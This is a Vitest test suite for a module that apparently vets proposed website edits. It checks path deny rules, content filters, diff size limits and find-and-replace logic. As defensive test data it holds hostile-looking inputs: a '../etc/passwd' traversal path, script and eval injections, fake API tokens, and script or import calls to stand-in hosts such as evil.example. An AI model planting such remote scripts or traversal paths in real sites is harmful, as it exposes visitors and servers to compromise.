import { describe, expect, it } from "vitest";
import { applyEdits, contentProblem, MAX_FILES, pathProblem, type ProposedEdit, smallDiff } from "@/lib/webfix-edits";
import { SITE_FILES } from "./fixtures/webfix-site";

const why = { es: "Título más corto.", en: "Shorter title." };
const edit = (path: string, find: string, replace: string, issueIds = ["title-too-long"]): ProposedEdit => ({ path, find, replace, why, issueIds });
const files = new Map(Object.entries(SITE_FILES));
const existing = new Set(files.keys());

describe("pathProblem", () => {
  it("allows the site's pages, components, copy, data and public text files", () => {
    for (const p of ["app/es/page.tsx", "app/(en)/services/[slug]/page.tsx", "components/service-page.tsx", "lib/preview-services.ts", "content/articles.json", "public/llms.txt", "public/sitemap.xml", "src/app/page.tsx"])
      expect(pathProblem(p), p).toBeNull();
  });
  it("denies config, CI, scripts, tests, lockfiles, env, proxy and anything outside the allowed folders", () => {
    for (const p of [
      ".github/workflows/ci.yml",
      "package.json",
      "package-lock.json",
      "pnpm-lock.yaml",
      "yarn.lock",
      ".env",
      ".env.local",
      "next.config.ts",
      "proxy.ts",
      "middleware.ts",
      "scripts/check.mjs",
      "supabase/migrations/1.sql",
      "vendor/x.css",
      "tests/leads.test.mjs",
      "app/tests/x.ts",
      "lib/x.test.ts",
      "README.md",
      "public/hero.png",
      "public/images/a.txt",
      "../etc/passwd",
      "/app/page.tsx",
      "app//page.tsx",
      "app/./page.tsx",
      "app\\page.tsx",
    ])
      expect(pathProblem(p), p).not.toBeNull();
  });
});

describe("contentProblem", () => {
  it("rejects scripts, dangerouslySetInnerHTML, eval, iframes and env access", () => {
    expect(contentProblem("a", "<script>alert(1)</script>", "a")).not.toBeNull();
    expect(contentProblem("a", "<Script id='x' />", "a")).not.toBeNull();
    expect(contentProblem("a", "<div dangerouslySetInnerHTML={{__html: x}} />", "a")).not.toBeNull();
    expect(contentProblem("a", "eval(code)", "a")).not.toBeNull();
    expect(contentProblem("a", "<iframe src='x' />", "a")).not.toBeNull();
    expect(contentProblem("a", "process.env.SECRET", "a")).not.toBeNull();
  });
  it("lets an existing script be kept but not multiplied", () => {
    const old = '<script type="application/ld+json">{"name":"A"}</script>';
    expect(contentProblem(old, old.replace('"A"', '"B"'), old)).toBeNull();
    expect(contentProblem(old, `${old}${old}`, old)).not.toBeNull();
  });
  it("never touches tracking", () => {
    expect(contentProblem("pixelSetup", "pixelSetup2", "x")).not.toBeNull();
    expect(contentProblem("a", "gtag('event')", "a")).not.toBeNull();
  });
  it("rejects secret-looking strings and new external script hosts", () => {
    expect(contentProblem("a", "const k = 'github_pat_11ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';", "a")).not.toBeNull();
    expect(contentProblem("a", 'apiKey: "AIzaSyA1234567890abcdefghijklmnopqrstuv"', "a")).not.toBeNull();
    expect(contentProblem("a", 'token = "abcdefghijklmnop1234"', "a")).not.toBeNull();
    expect(contentProblem("a", '<img src="https://evil.example/x.js" />', "a")).not.toBeNull();
    expect(contentProblem("a", 'import("https://cdn.evil.example/m.js")', "a")).not.toBeNull();
    // Un enlace normal (href) o un host que ya estaba en el archivo está bien.
    expect(contentProblem("a", '<a href="https://www.google.com/maps">Mapa</a>', "a")).toBeNull();
    expect(contentProblem("a", '<img src="https://ricardopa.com/x.png" />', "see https://ricardopa.com/")).toBeNull();
  });
});

describe("applyEdits", () => {
  it("applies a find that occurs exactly once and keeps a small diff", () => {
    const r = applyEdits([edit("lib/preview-services.ts", 'seoTitle: "Water Damage Claims in Miami"', 'seoTitle: "Water Damage Claims in Miami, FL"')], files, existing);
    expect(r.dropped).toEqual([]);
    expect(r.changes).toHaveLength(1);
    expect(r.changes[0].after).toContain("Miami, FL");
    expect(r.changes[0].diff).toMatch(/^- .*Miami"/m);
    expect(r.changes[0].diff).toMatch(/^\+ .*Miami, FL"/m);
    expect(r.changes[0].issueIds).toEqual(["title-too-long"]);
  });

  it("drops a find that is missing or appears more than once", () => {
    const r = applyEdits([edit("lib/preview-services.ts", "not there", "x"), edit("lib/preview-services.ts", "slug:", "slug2:")], files, existing);
    expect(r.changes).toEqual([]);
    expect(r.dropped.map((d) => d.reason.en)).toEqual([expect.stringContaining("isn't in the file"), expect.stringContaining("appears")]);
  });

  it("applies several edits to one file in order against the edited text", () => {
    const r = applyEdits(
      [
        edit("lib/preview-services.ts", 'title: "Roof Damage Claims"', 'title: "Roof Damage Insurance Claims"'),
        edit("lib/preview-services.ts", 'title: "Roof Damage Insurance Claims"', 'title: "Roof Damage Claims in Miami"'),
      ],
      files,
      existing,
    );
    expect(r.changes).toHaveLength(1);
    expect(r.changes[0].after).toContain("Roof Damage Claims in Miami");
    expect(r.changes[0].why).toHaveLength(2);
  });

  it("drops edits to denied, unread, binary or non-existing files", () => {
    const r = applyEdits(
      [
        edit("package.json", '"site"', '"x"'),
        edit("next.config.ts", "{}", "{ a: 1 }"),
        edit("components/landing-page.tsx", "main", "section"),
        edit("app/new/page.tsx", "", "export default function P() {}"),
        edit("public/hero.png", "PNG", "JPG"),
      ],
      new Map([["lib/preview-site.ts", SITE_FILES["lib/preview-site.ts"]]]),
      existing,
    );
    expect(r.changes).toEqual([]);
    expect(r.dropped).toHaveLength(5);
  });

  it("allows creating public/llms.txt but nothing else", () => {
    const r = applyEdits([edit("public/llms.txt", "", "# Ricardo PA\n"), edit("public/robots.txt", "x", "y")], files, existing);
    expect(r.changes.map((c) => [c.path, c.created])).toEqual([["public/llms.txt", true]]);
    expect(r.dropped).toHaveLength(1);
  });

  it("rejects empty results and no-op edits", () => {
    const tiny = new Map([["content/a.json", "[]"]]);
    const r = applyEdits([edit("content/a.json", "[]", "  "), edit("content/a.json", "[]", "[]")], tiny, new Set(tiny.keys()));
    expect(r.changes).toEqual([]);
    expect(r.dropped).toHaveLength(2);
  });

  it("never changes more than 20 files", () => {
    const many = new Map(Array.from({ length: MAX_FILES + 3 }, (_, i) => [`content/f${i}.json`, `{"n":${i}}`]));
    const edits = [...many.entries()].map(([p, c]) => edit(p, c, c.replace("}", ',"ok":true}')));
    const r = applyEdits(edits, many, new Set(many.keys()));
    expect(r.changes).toHaveLength(MAX_FILES);
    expect(r.dropped).toHaveLength(3);
  });

  it("rejects dangerous replacements", () => {
    const r = applyEdits([edit("components/document.tsx", "<html>", '<html><script src="https://x.example/a.js"></script>')], files, existing);
    expect(r.changes).toEqual([]);
    expect(r.dropped[0].reason.en).toMatch(/script/);
  });
});

describe("smallDiff", () => {
  it("shows context and the changed lines only", () => {
    const d = smallDiff("a\nb\nc\nd\ne\nf", "a\nb\nc\nX\ne\nf");
    expect(d.split("\n")).toEqual(["  b", "  c", "- d", "+ X", "  e", "  f"]);
  });
});
